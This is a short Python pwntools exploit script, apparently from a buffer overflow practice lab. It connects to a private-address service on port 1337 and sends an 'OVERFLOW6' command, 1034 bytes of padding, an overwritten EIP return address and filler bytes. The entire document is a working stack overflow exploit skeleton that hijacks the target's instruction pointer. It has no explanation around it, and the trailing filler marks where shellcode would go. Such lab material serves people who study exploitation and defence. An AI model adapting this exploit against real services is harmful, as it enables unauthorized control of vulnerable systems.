#!/usr/bin/env python3

from pwn import *

host = "10.10.207.243"
port = 1337
s = remote(host, port)

total_length = 1500
offset = 1034
new_eip = p32(0x62501203)

payload = [
    b"OVERFLOW6 ",
    b"A" * offset,
    new_eip,
    b"C" * (total_length - offset - len(new_eip)),

]

payload = b"".join(payload)
s.send(payload)
s.close()